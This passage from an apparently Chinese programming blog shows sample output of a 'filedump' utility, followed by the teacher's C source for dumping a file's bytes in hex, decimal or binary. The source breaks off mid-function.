PQRS</span><br><span class="line"><span class="number">01010100</span>	<span class="number">01010101</span>	<span class="number">01010110</span>	<span class="number">01010111</span>	  TUVW</span><br><span class="line"><span class="number">01011000</span>	<span class="number">01011001</span>	<span class="number">01011010</span>	<span class="number">01011011</span>	  XYZ[</span><br><span class="line"><span class="number">01011100</span>	<span class="number">01011101</span>	<span class="number">01011110</span>	<span class="number">01011111</span>	  \]^_</span><br><span class="line"><span class="number">01100000</span>	<span class="number">01100001</span>	<span class="number">01100010</span>	<span class="number">01100011</span>	  `abc</span><br><span class="line"><span class="number">01100100</span>	<span class="number">01100101</span>	<span class="number">01100110</span>	<span class="number">01100111</span>	  defg</span><br><span class="line"><span class="number">01101000</span>	<span class="number">01101001</span>	<span class="number">01101010</span>	<span class="number">01101011</span>	  hijk</span><br><span class="line"><span class="number">01101100</span>	<span class="number">01101101</span>	<span class="number">01101110</span>	<span class="number">01101111</span>	  lmno</span><br><span class="line"><span class="number">01110000</span>	<span class="number">01110001</span>	<span class="number">01110010</span>	<span class="number">01110011</span>	  pqrs</span><br><span class="line"><span class="number">01110100</span>	<span class="number">01110101</span>	<span class="number">01110110</span>	<span class="number">01110111</span>	  tuvw</span><br><span class="line"><span class="number">01111000</span>	<span class="number">01111001</span>	<span class="number">01111010</span>	<span class="number">01111011</span>	  xyz&#123;</span><br><span class="line"><span class="number">01111100</span>	<span class="number">01111101</span>	<span class="number">01111110</span>	<span class="number">01111111</span>	  |&#125;~</span><br><span class="line"><span class="number">10000000</span>	<span class="number">10000001</span>	<span class="number">10000010</span>	<span class="number">10000011</span>	  ....</span><br><span class="line"><span class="number">10000100</span>	<span class="number">10000101</span>	<span class="number">10000110</span>	<span class="number">10000111</span>	  ....</span><br><span class="line"><span class="number">10001000</span>	<span class="number">10001001</span>	<span class="number">10001010</span>	<span class="number">10001011</span>	  ....</span><br><span class="line"><span class="number">10001100</span>	<span class="number">10001101</span>	<span class="number">10001110</span>	<span class="number">10001111</span>	  ....</span><br><span class="line"><span class="number">10010000</span>	<span class="number">10010001</span>	<span class="number">10010010</span>	<span class="number">10010011</span>	  ....</span><br><span class="line"><span class="number">10010100</span>	<span class="number">10010101</span>	<span class="number">10010110</span>	<span class="number">10010111</span>	  ....</span><br><span class="line"><span class="number">10011000</span>	<span class="number">10011001</span>	<span class="number">10011010</span>	<span class="number">10011011</span>	  ....</span><br><span class="line"><span class="number">10011100</span>	<span class="number">10011101</span>	<span class="number">10011110</span>	<span class="number">10011111</span>	  ....</span><br><span class="line"><span class="number">10100000</span>	<span class="number">10100001</span>	<span class="number">10100010</span>	<span class="number">10100011</span>	  ....</span><br><span class="line"><span class="number">10100100</span>	<span class="number">10100101</span>	<span class="number">10100110</span>	<span class="number">10100111</span>	  ....</span><br><span class="line"><span class="number">10101000</span>	<span class="number">10101001</span>	<span class="number">10101010</span>	<span class="number">10101011</span>	  ....</span><br><span class="line"><span class="number">10101100</span>	<span class="number">10101101</span>	<span class="number">10101110</span>	<span class="number">10101111</span>	  ....</span><br><span class="line"><span class="number">10110000</span>	<span class="number">10110001</span>	<span class="number">10110010</span>	<span class="number">10110011</span>	  ....</span><br><span class="line"><span class="number">10110100</span>	<span class="number">10110101</span>	<span class="number">10110110</span>	<span class="number">10110111</span>	  ....</span><br><span class="line"><span class="number">10111000</span>	<span class="number">10111001</span>	<span class="number">10111010</span>	<span class="number">10111011</span>	  ....</span><br><span class="line"><span class="number">10111100</span>	<span class="number">10111101</span>	<span class="number">10111110</span>	<span class="number">10111111</span>	  ....</span><br><span class="line"><span class="number">11000000</span>	<span class="number">11000001</span>	<span class="number">11000010</span>	<span class="number">11000011</span>	  ....</span><br><span class="line"><span class="number">11000100</span>	<span class="number">11000101</span>	<span class="number">11000110</span>	<span class="number">11000111</span>	  ....</span><br><span class="line"><span class="number">11001000</span>	<span class="number">11001001</span>	<span class="number">11001010</span>	<span class="number">11001011</span>	  ....</span><br><span class="line"><span class="number">11001100</span>	<span class="number">11001101</span>	<span class="number">11001110</span>	<span class="number">11001111</span>	  ....</span><br><span class="line"><span class="number">11010000</span>	<span class="number">11010001</span>	<span class="number">11010010</span>	<span class="number">11010011</span>	  ....</span><br><span class="line"><span class="number">11010100</span>	<span class="number">11010101</span>	<span class="number">11010110</span>	<span class="number">11010111</span>	  ....</span><br><span class="line"><span class="number">11011000</span>	<span class="number">11011001</span>	<span class="number">11011010</span>	<span class="number">11011011</span>	  ....</span><br><span class="line"><span class="number">11011100</span>	<span class="number">11011101</span>	<span class="number">11011110</span>	<span class="number">11011111</span>	  ....</span><br><span class="line"><span class="number">11100000</span>	<span class="number">11100001</span>	<span class="number">11100010</span>	<span class="number">11100011</span>	  ....</span><br><span class="line"><span class="number">11100100</span>	<span class="number">11100101</span>	<span class="number">11100110</span>	<span class="number">11100111</span>	  ....</span><br><span class="line"><span class="number">11101000</span>	<span class="number">11101001</span>	<span class="number">11101010</span>	<span class="number">11101011</span>	  ....</span><br><span class="line"><span class="number">11101100</span>	<span class="number">11101101</span>	<span class="number">11101110</span>	<span class="number">11101111</span>	  ....</span><br><span class="line"><span class="number">11110000</span>	<span class="number">11110001</span>	<span class="number">11110010</span>	<span class="number">11110011</span>	  ....</span><br><span class="line"><span class="number">11110100</span>	<span class="number">11110101</span>	<span class="number">11110110</span>	<span class="number">11110111</span>	  ....</span><br><span class="line"><span class="number">11111000</span>	<span class="number">11111001</span>	<span class="number">11111010</span>	<span class="number">11111011</span>	  ....</span><br><span class="line"><span class="number">11111100</span>	<span class="number">11111101</span>	<span class="number">11111110</span>	<span class="number">11111111</span>	  ....</span><br><span class="line">ERROR! Usage: &quot;filedump -xXdDbB filename&quot;</span><br><span class="line">-x/X to dump by hexadecimal</span><br><span class="line">-d/D to dump by decimal</span><br><span class="line">-b/B to dump by binary</span><br><span class="line">ERROR! Usage: &quot;filedump -xXdDbB filename&quot;</span><br><span class="line">-x/X to dump by hexadecimal</span><br><span class="line">-d/D to dump by decimal</span><br><span class="line">-b/B to dump by binary</span><br><span class="line">filename is name of the file whose contents you want to dump</span><br></pre></td></tr></table></figure>
<p>如果你有更好的解决方案，欢迎与我交流，有问题请指正。</p>
<p>最后的最后，附上老师的code。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//This code is start at 2020/2/12 during corona-virus events</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DF_LINEMAX (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DF_BINMODE_BYTENUM (4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DF_HEXFMT <span class="meta-string">&quot;%2.2x   &quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DF_DECFMT <span class="meta-string">&quot;%03d  &quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DF_HEXDECSPC <span class="meta-string">&quot;%5s&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DF_BINSPC <span class="meta-string">&quot;%8s\t&quot;</span></span></span><br><span class="line"><span class="comment">//define support file dump mode</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> <span class="title">dumpxmode</span>&#123;</span></span><br><span class="line">    USAGE,  <span class="comment">//help message</span></span><br><span class="line">    xMODE,  <span class="comment">//up/down hex</span></span><br><span class="line">    XMODE,  <span class="comment">//left/right hex</span></span><br><span class="line">    dMODE,  <span class="comment">//up/down decimal</span></span><br><span class="line">    DMODE,  <span class="comment">//left/right decimal</span></span><br><span class="line">    bMODE,  <span class="comment">//up/down binary</span></span><br><span class="line">    BMODE   <span class="comment">//L/R binary</span></span><br><span class="line">&#125; FDUMPxmode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// define enough buffer</span></span><br><span class="line"><span class="keyword">char</span> buff[DF_LINEMAX+DF_BINMODE_BYTENUM];</span><br><span class="line"><span class="comment">//prototype define</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printchar</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> maxlen,FDUMPxmode dpmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printfmt</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> maxlen, <span class="keyword">char</span> *fmt,FDUMPxmode dpmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_datfile</span><span class="params">(<span class="keyword">char</span> * fname)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbin</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> maxlen,FDUMPxmode dpmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processbuf</span><span class="params">(<span class="keyword">char</span>*buf, <span class="keyword">int</span> len, FDUMPxmode dpxmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getLineLength</span><span class="params">(FDUMPxmode dpxmode)</span></span>;</span><br><span class="line"><span class="function">FDUMPxmode <span class="title">getdpmode</span><span class="params">(<span class="keyword">char</span> *args)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSpace</span><span class="params">(<span class="keyword">int</span> cols,FDUMPxmode dpmode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *asciiabl[]=&#123; \</span><br><span class="line">    <span class="string">&quot;NUL&quot;</span>,<span class="string">&quot;SOH&quot;</span>,<span class="string">&quot;STX&quot;</span>,<span class="string">&quot;ETX&quot;</span>,<span class="string">&quot;EOT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ENQ&quot;</span>,<span class="string">&quot;ACK&quot;</span>,<span class="string">&quot;BEL&quot;</span>,<span class="string">&quot;BS&quot;</span>,<span class="string">&quot;TAB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LF&quot;</span>, <span class="string">&quot;VT&quot;</span>, <span class="string">&quot;FF&quot;</span>, <span class="string">&quot;CR&quot;</span>, <span class="string">&quot;SO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SI&quot;</span>,<span class="string">&quot;DLE&quot;</span>,<span class="string">&quot;DC1&quot;</span>,<span class="string">&quot;DC2&quot;</span>,<span class="string">&quot;DC3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DC4&quot;</span>,<span class="string">&quot;NAK&quot;</span>,<span class="string">&quot;SYN&quot;</span>,<span class="string">&quot;ETB&quot;</span>,<span class="string">&quot;CAN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EM&quot;</span>,<span class="string">&quot;SUB&quot;</span>,<span class="string">&quot;ESC&quot;</span>,<span class="string">&quot;FS&quot;</span>,<span class="string">&quot;GS&quot;</span>,<span class="string">&quot;RS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;US&quot;</span>,<span class="string">&quot;SP&quot;</span>,<span class="string">&quot;!&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> data;</span><br><span class="line">    FDUMPxmode dpxmode;</span><br><span class="line">    <span class="keyword">int</span> binlen;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> lenMAX = DF_BINMODE_BYTENUM;</span><br><span class="line">     <span class="comment">/*get arguments from command line*/</span></span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//not input filename</span></span><br><span class="line">        dpxmode =USAGE;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">//&gt;=3</span></span><br><span class="line">        dpxmode =getdpmode(argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dpxmode == USAGE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: filedump option file.dat\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;option: -x|-X|-d|-D|-b|-B \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;file.dat: the file will be dumped.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get output bytes number</span></span><br><span class="line">    lenMAX= getLineLength(dpxmode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//create_datfile(argv[1]);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//open file for binary read</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="comment">//file stream open for read binary xmode</span></span><br><span class="line">    fp=fopen(argv[<span class="number">2</span>],<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//open failed</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open file %s failed!\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//read file contents and printf</span></span><br><span class="line">    len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof(fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//get 1byte of char</span></span><br><span class="line">        data=fgetc(fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//read DF_LINEMAX byte of chars</span></span><br><span class="line">        <span class="keyword">if</span>(len &lt; lenMAX &amp;&amp; (!feof(fp)))</span><br><span class="line">        &#123;</span><br><span class="line">            buff[len]=data;</span><br><span class="line">            len++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//16byte of chars output</span></span><br><span class="line">            processbuf(buff,len,dpxmode);</span><br><span class="line"></span><br><span class="line">            len=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//revise for lost 0x10 0x20 ...</span></span><br><span class="line">            buff[len]=data;</span><br><span class="line">            len++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//process read in data from FileStream</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processbuf</span><span class="params">(<span class="keyword">char</span>*buf, <span class="keyword">int</span> len, FDUMPxmode dpxmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(dpxmode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> xMODE: <span class="comment">//up/down hex</span></span><br><span class="line">            printchar(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            printfmt(buf,len,<span class="string">&quot;%2.2x\t&quot;</span>,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> dMODE: <span class="comment">//up/down dec</span></span><br><span class="line">            printchar(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            printfmt(buf,len,<span class="string">&quot;%03d\t&quot;</span>,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> bMODE: <span class="comment">//up/down binary</span></span><br><span class="line">            printchar(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            printbin(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> XMODE: <span class="comment">// /L/R hex</span></span><br><span class="line">            printfmt(buf,len,DF_HEXFMT,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            printchar(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DMODE: <span class="comment">//L/R dec</span></span><br><span class="line">            printfmt(buf,len,DF_DECFMT,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            printchar(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BMODE: <span class="comment">//L/R bin</span></span><br><span class="line">            printbin(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            printchar(buf,len,dpxmode);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">//never come here</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Never come here!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get output byte number</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getLineLength</span><span class="params">(FDUMPxmode dpxmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//get read byte number</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(dpxmode ==bMODE || dpxmode ==BMODE)</span><br><span class="line">    &#123;</span><br><span class="line">        len=DF_BINMODE_BYTENUM;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        len= DF_LINEMAX;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get selected mode</span></span><br><span class="line"><span class="function">FDUMPxmode <span class="title">getdpmode</span><span class="params">(<span class="keyword">char</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FDUMPxmode dpxmode;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(args,<span class="string">&quot;-x&quot;</span>,<span class="number">2</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dpxmode =xMODE;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(args,<span class="string">&quot;-X&quot;</span>,<span class="number">2</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dpxmode =XMODE;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(args,<span class="string">&quot;-d&quot;</span>,<span class="number">2</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dpxmode =dMODE;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(args,<span class="string">&quot;-D&quot;</span>,<span class="number">2</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dpxmode =DMODE;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(args,<span class="string">&quot;-b&quot;</span>,<span class="number">2</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dpxmode =bMODE;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(args,<span class="string">&quot;-B&quot;</span>,<span class="number">2</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dpxmode =BMODE;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//usage</span></span><br><span class="line">        dpxmode = USAGE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dpxmode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print char with visible ascii</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printchar</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> maxlen, FDUMPxmode dpmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> tempdata;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;maxlen;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tempdata=buf[i];</span><br><span class="line">        <span class="keyword">if</span>(tempdata &lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(dpmode==XMODE || dpmode==DMODE||dpmode==BMODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dpmode==bMODE)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c\t\t&quot;</span>,<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c\t&quot;</span>,<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tempdata&lt;=<span class="number">0x20</span>)&#123;</span><br><span class="line">            <span class="comment">//index must unsigned</span></span><br><span class="line">            <span class="keyword">if</span>(dpmode==XMODE || dpmode==DMODE||dpmode==BMODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//L/R mode replace with DOT|?</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dpmode==bMODE)&#123;</span><br><span class="line">                <span class="comment">//u/d mode replace with special named chars</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\t\t&quot;</span>,asciiabl[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)tempdata]);</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,asciiabl[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)tempdata]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//0x21==0x7F</span></span><br><span class="line">            <span class="keyword">if</span>(dpmode==XMODE || dpmode==DMODE||dpmode==BMODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//L/R</span></span><br><span class="line">                <span class="comment">//0x7F DELETE has no display font</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(tempdata!=<span class="number">0x7f</span>)?tempdata:<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//u/d</span></span><br><span class="line">                <span class="keyword">if</span>(tempdata!=<span class="number">0x7F</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(dpmode==bMODE)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%c\t\t&quot;</span>,tempdata);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* code */</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%c\t&quot;</span>,tempdata);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//0x7F DELETE has no display font</span></span><br><span class="line">                    <span class="comment">/* code */</span></span><br><span class="line">                    <span class="keyword">if</span>(dpmode==bMODE)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%s\t\t&quot;</span>,<span class="string">&quot;DEL&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* code */</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;DEL&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print last space for L/R mode</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSpace</span><span class="params">(<span class="keyword">int</span> cols,FDUMPxmode dpmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(dpmode ==BMODE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;cols;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(DF_BINSPC,<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;cols;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(DF_HEXDECSPC,<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print binary of the char</span></span><br><span class="line"><span class="comment">// char with visible ascii</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbin</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> maxlen,FDUMPxmode dpmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> templen=getLineLength(dpmode);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;maxlen;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(buf[i]&amp;(<span class="number">0x80</span>&gt;&gt;j))!=<span class="number">0</span>?<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//actural num &lt; define max number</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(maxlen&lt;templen &amp;&amp; maxlen!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printSpace((templen-maxlen),dpmode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// printf hex oct dec format</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printfmt</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> maxlen,<span class="keyword">char</span> *fmt,FDUMPxmode dpmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    